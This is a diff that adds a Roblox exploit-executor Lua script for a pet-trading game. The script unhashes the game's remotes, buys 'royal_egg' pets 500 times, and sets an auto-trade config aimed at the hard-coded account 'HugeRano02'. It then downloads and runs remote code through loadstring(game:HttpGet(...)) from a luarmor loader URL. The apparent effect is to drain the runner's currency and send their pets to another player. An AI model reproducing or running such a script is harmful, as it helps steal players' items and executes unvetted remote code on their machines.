@@ -1,0 +1,34 @@
+local function rename(remotename, hashedremote)
+    hashedremote.Name = remotename
+end
+
+table.foreach(getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init, 7), rename)
+task.wait(20)
+
+task.spawn(function()
+    task.wait(0.1)
+    for i = 1,500 do task.wait()
+        local args = {
+            [1] = "pets",
+            [2] = "royal_egg",
+            [3] = {
+                ["buy_count"] = 1
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
+    end
+end)
+
+
+task.spawn(function()
+    getgenv().Config = {
+        ["inventory"] = "pets", -- Adapt to stickers, gifts, toys, pet_accessories, transport
+        ["username"] = "HugeRano02",
+        ["pets_to_trade"] = {"royal_egg"} -- or lures_2023_blazing_lion cant auto trade gifts with pet ONLY 1
+    }
+    getgenv().trade_status = true
+    getgenv().pets_unique_ids = {}
+
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a5386bfa9bb03ae1da997e3078394366.lua"))()
+end)
